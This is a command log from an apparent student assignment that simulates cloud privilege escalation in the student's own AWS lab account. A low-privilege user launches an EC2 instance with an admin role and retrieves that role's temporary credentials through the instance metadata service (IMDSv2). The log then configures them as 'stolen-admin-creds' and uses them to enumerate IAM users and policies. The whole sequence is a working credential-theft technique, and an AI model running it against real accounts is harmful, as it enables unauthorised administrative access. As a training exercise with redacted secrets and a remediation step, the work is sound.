================================================================
PRIVILEGE ESCALATION COMMANDS LOG
Assignment 5: Cloud Privilege Escalation Simulation
All account IDs, key material redacted as <ACCOUNT_ID> / <REDACTED>
================================================================

--- Key pair (attempt 1: failed due to Windows text encoding) ---

PS C:\Users\USER> aws ec2 create-key-pair --key-name bincom-privesc-key --query "KeyMaterial" --output text --profile bincom-admin > bincom-privesc-key.pem

Note: PowerShell's ">" redirect writes UTF-16LE with a byte order mark by
default, which corrupts a plain text SSH private key. This caused an
"invalid format" error at the SSH step below and had to be corrected.

--- Instance launch (attempt 1: wrong instance type) ---

PS C:\Users\USER> aws ec2 describe-images --owners amazon --filters "Name=name,Values=al2023-ami-*-x86_64" "Name=state,Values=available" --query "sort_by(Images, &CreationDate)[-1].ImageId" --output text --profile bincom-admin
ami-0bdbbea3e76315b75

PS C:\Users\USER> aws ec2 run-instances --image-id ami-0bdbbea3e76315b75 --instance-type t2.micro --key-name bincom-privesc-key --security-group-ids sg-07dd6d0efee71dcaf --subnet-id subnet-014b46080b850a527 --iam-instance-profile Name=EC2-Admin-Instance-Profile --tag-specifications "ResourceType=instance,Tags=[{Key=Name,Value=privesc-exploit-instance}]" --profile bincom-dev-user

aws: [ERROR]: An error occurred (InvalidParameterCombination) when calling
the RunInstances operation: The specified instance type is not eligible
for Free Tier. For a list of Free Tier instance types, run
'describe-instance-types' with the filter 'free-tier-eligible=true'.

PS C:\Users\USER> aws ec2 describe-instance-types --filters "Name=free-tier-eligible,Values=true" --query "InstanceTypes[].InstanceType" --output text --profile bincom-admin
t8i.micro   c7i-flex.large   t4g.small   t4g.micro   t3.micro   t3.small   t8i.small   m7i-flex.large

--- Instance launch (attempt 2: t3.small, but with the corrupted key) ---

PS C:\Users\USER> aws ec2 run-instances --image-id ami-0bdbbea3e76315b75 --instance-type t3.small --key-name bincom-privesc-key --security-group-ids sg-07dd6d0efee71dcaf --subnet-id subnet-014b46080b850a527 --iam-instance-profile Name=EC2-Admin-Instance-Profile --tag-specifications "ResourceType=instance,Tags=[{Key=Name,Value=privesc-exploit-instance}]" --profile bincom-dev-user
[Result: InstanceId = i-06b8c4cc0dd2ad0bc, launched successfully]

PS C:\Users\USER> ssh -i bincom-privesc-key.pem ec2-user@<PUBLIC_IP>
Load key "bincom-privesc-key.pem": invalid format
ec2-user@<PUBLIC_IP>: Permission denied (publickey,gssapi-keyex,gssapi-with-mic).

--- Fix: recreate key pair with correct encoding, relaunch ---

PS C:\Users\USER> Remove-Item bincom-privesc-key.pem
PS C:\Users\USER> aws ec2 terminate-instances --instance-ids i-06b8c4cc0dd2ad0bc --profile bincom-dev-user
{
    "TerminatingInstances": [
        {
            "InstanceId": "i-06b8c4cc0dd2ad0bc",
            "CurrentState": { "Code": 32, "Name": "shutting-down" },
            "PreviousState": { "Code": 16, "Name": "running" }
        }
    ]
}

PS C:\Users\USER> aws ec2 delete-key-pair --key-name bincom-privesc-key --profile bincom-admin
{ "Return": true, "KeyPairId": "key-0dc9069afc7f2b704" }

PS C:\Users\USER> aws ec2 create-key-pair --key-name bincom-privesc-key --query "KeyMaterial" --output text --profile bincom-admin | Out-File -Encoding ascii bincom-privesc-key.pem

PS C:\Users\USER> icacls.exe bincom-privesc-key.pem /reset
PS C:\Users\USER> icacls.exe bincom-privesc-key.pem /grant:r "$($env:USERNAME):(R)"
PS C:\Users\USER> icacls.exe bincom-privesc-key.pem /inheritance:r

--- Instance launch (attempt 3: successful) ---

PS C:\Users\USER> aws ec2 run-instances --image-id ami-0bdbbea3e76315b75 --instance-type t3.small --key-name bincom-privesc-key --security-group-ids sg-07dd6d0efee71dcaf --subnet-id subnet-014b46080b850a527 --iam-instance-profile Name=EC2-Admin-Instance-Profile --tag-specifications "ResourceType=instance,Tags=[{Key=Name,Value=privesc-exploit-instance}]" --profile bincom-dev-user
{
    "ReservationId": "r-09c86e751a6ba228e",
    "OwnerId": "<ACCOUNT_ID>",
    "Instances": [
        {
            "IamInstanceProfile": {
                "Arn": "arn:aws:iam::<ACCOUNT_ID>:instance-profile/EC2-Admin-Instance-Profile",
                "Id": "AIPA36RW26SYGYODO432C"
            },
            "InstanceId": "i-04450e4e36f6480bd",
            "ImageId": "ami-0bdbbea3e76315b75",
            "State": { "Code": 0, "Name": "pending" },
            "KeyName": "bincom-privesc-key",
            "InstanceType": "t3.small",
            "MetadataOptions": {
                "HttpTokens": "required",
                "HttpPutResponseHopLimit": 2,
                "HttpEndpoint": "enabled"
            },
            "SubnetId": "subnet-014b46080b850a527",
            "VpcId": "vpc-01d4ff00ae4c24ee2",
            "PrivateIpAddress": "10.0.1.225"
        }
    ]
}

PS C:\Users\USER> aws ec2 describe-instances --instance-ids i-04450e4e36f6480bd --query "Reservations[0].Instances[0].[State.Name,PublicIpAddress]" --profile bincom-dev-user
[
    "running",
    "3.234.228.246"
]

--- SSH connection and IMDSv2 credential theft ---

PS C:\Users\USER> ssh -i bincom-privesc-key.pem ec2-user@3.234.228.246
Amazon Linux 2023
Last login: Thu Sep 24 07:51:58 2026 from <REDACTED>

[ec2-user@ip-10-0-1-225 ~]$ TOKEN=`curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600"`
[ec2-user@ip-10-0-1-225 ~]$ echo $TOKEN
AQAEABahdxwl9FdtoD3k1haAMGFLl3oaqs7MZdZxX8e3xxQoQQYafg==

[ec2-user@ip-10-0-1-225 ~]$ curl -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials/
EC2-Admin-Role

[ec2-user@ip-10-0-1-225 ~]$ curl -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials/EC2-Admin-Role
{
  "Code" : "Success",
  "LastUpdated" : "2026-09-24T07:35:10Z",
  "Type" : "AWS-HMAC",
  "AccessKeyId" : "<REDACTED>",
  "SecretAccessKey" : "<REDACTED>",
  "Token" : "<REDACTED>",
  "Expiration" : "2026-09-24T14:11:07Z"
}

--- Configuring stolen credentials and proving escalation ---

PS C:\Users\USER> aws configure set aws_access_key_id <REDACTED> --profile stolen-admin-creds
PS C:\Users\USER> aws configure set aws_secret_access_key <REDACTED> --profile stolen-admin-creds
PS C:\Users\USER> aws configure set aws_session_token "<REDACTED>" --profile stolen-admin-creds
PS C:\Users\USER> aws configure set region us-east-1 --profile stolen-admin-creds

PS C:\Users\USER> aws sts get-caller-identity --profile stolen-admin-creds
{
    "UserId": "AROA36RW26SYCHM6PPL4J:i-04450e4e36f6480bd",
    "Account": "<ACCOUNT_ID>",
    "Arn": "arn:aws:sts::<ACCOUNT_ID>:assumed-role/EC2-Admin-Role/i-04450e4e36f6480bd"
}

PS C:\Users\USER> aws iam list-users --profile stolen-admin-creds
{
    "Users": [
        {
            "Path": "/",
            "UserName": "bincom-dev-user",
            "UserId": "AIDA36RW26SYFDEXAFIT6",
            "Arn": "arn:aws:iam::<ACCOUNT_ID>:user/bincom-dev-user",
            "CreateDate": "2026-09-24T06:06:22+00:00"
        },
        {
            "Path": "/",
            "UserName": "<REDACTED>",
            "UserId": "<REDACTED>",
            "Arn": "arn:aws:iam::<ACCOUNT_ID>:user/<REDACTED>",
            "CreateDate": "2026-09-23T15:46:50+00:00"
        }
    ]
}

PS C:\Users\USER> aws iam list-attached-user-policies --user-name bincom-dev-user --profile stolen-admin-creds
{
    "AttachedPolicies": [
        {
            "PolicyName": "BincomDevUserPolicy",
            "PolicyArn": "arn:aws:iam::<ACCOUNT_ID>:policy/BincomDevUserPolicy"
        }
    ]
}

================================================================
RESULT: bincom-dev-user, a user with no IAM read permissions of its own,
successfully enumerated every IAM user and policy in the account via
credentials obtained through iam:PassRole + ec2:RunInstances + IMDS.
See remediation-commands.log for the fix and re-test.
================================================================
